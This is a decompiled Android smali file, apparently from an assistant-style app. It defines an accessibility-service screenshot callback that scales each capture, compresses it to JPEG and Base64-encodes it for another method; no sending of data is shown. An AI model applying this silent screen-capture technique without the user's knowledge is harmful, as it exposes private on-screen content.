.class Lcom/dogac/bin1/EkranGozu$6$1;
.super Ljava/lang/Object;
.source "EkranGozu.java"

# interfaces
.implements Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/dogac/bin1/EkranGozu$6;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/dogac/bin1/EkranGozu$6;


# direct methods
.method constructor <init>(Lcom/dogac/bin1/EkranGozu$6;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 168
    iput-object p1, p0, Lcom/dogac/bin1/EkranGozu$6$1;->this$0:Lcom/dogac/bin1/EkranGozu$6;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onFailure(I)V
    .locals 4

    .line 181
    iget-object v0, p0, Lcom/dogac/bin1/EkranGozu$6$1;->this$0:Lcom/dogac/bin1/EkranGozu$6;

    iget-object v0, v0, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    iget-object v1, p0, Lcom/dogac/bin1/EkranGozu$6$1;->this$0:Lcom/dogac/bin1/EkranGozu$6;

    iget-object v1, v1, Lcom/dogac/bin1/EkranGozu$6;->val$bilgi:[Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "ekran g\u00f6r\u00fcnt\u00fcs\u00fc al\u0131namad\u0131 ("

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, ")"

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 v2, 0x0

    invoke-static {v0, v1, v2, p1}, Lcom/dogac/bin1/EkranGozu;->bitir(Landroid/content/Context;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public onSuccess(Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;)V
    .locals 5

    const/4 v0, 0x0

    .line 172
    :try_start_0
    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;->getHardwareBuffer()Landroid/hardware/HardwareBuffer;

    move-result-object v1

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;->getColorSpace()Landroid/graphics/ColorSpace;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/graphics/Bitmap;->wrapHardwareBuffer(Landroid/hardware/HardwareBuffer;Landroid/graphics/ColorSpace;)Landroid/graphics/Bitmap;

    move-result-object v1

    .line 173
    sget-object v2, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    move-result-object v2

    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    invoke-virtual {p1}, Landroid/accessibilityservice/AccessibilityService$ScreenshotResult;->getHardwareBuffer()Landroid/hardware/HardwareBuffer;

    move-result-object p1

    invoke-virtual {p1}, Landroid/hardware/HardwareBuffer;->close()V

    .line 174
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getWidth()I

    move-result p1

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v1

    invoke-static {p1, v1}, Ljava/lang/Math;->max(II)I

    move-result v3

    int-to-float v3, v3

    const/high16 v4, 0x44a00000    # 1280.0f

    div-float/2addr v4, v3

    const/high16 v3, 0x3f800000    # 1.0f

    invoke-static {v3, v4}, Ljava/lang/Math;->min(FF)F

    move-result v4

    cmpg-float v3, v4, v3

    if-gez v3, :cond_0

    int-to-float p1, p1

    mul-float/2addr p1, v4

    .line 175
    invoke-static {p1}, Ljava/lang/Math;->round(F)I

    move-result p1

    int-to-float v1, v1

    mul-float/2addr v1, v4

    invoke-static {v1}, Ljava/lang/Math;->round(F)I

    move-result v1

    const/4 v3, 0x1

    invoke-static {v2, p1, v1, v3}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object p1

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V

    move-object v2, p1

    .line 176
    :cond_0
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v1, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x48

    invoke-virtual {v2, v1, v3, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V

    .line 177
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    const/4 v1, 0x2

    invoke-static {p1, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-object p1, v0

    .line 179
    :goto_0
    iget-object v1, p0, Lcom/dogac/bin1/EkranGozu$6$1;->this$0:Lcom/dogac/bin1/EkranGozu$6;

    iget-object v1, v1, Lcom/dogac/bin1/EkranGozu$6;->val$s:Lcom/dogac/bin1/CarvisErisim;

    iget-object v2, p0, Lcom/dogac/bin1/EkranGozu$6$1;->this$0:Lcom/dogac/bin1/EkranGozu$6;

    iget-object v2, v2, Lcom/dogac/bin1/EkranGozu$6;->val$bilgi:[Ljava/lang/String;

    invoke-static {v1, v2, p1, v0}, Lcom/dogac/bin1/EkranGozu;->bitir(Landroid/content/Context;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
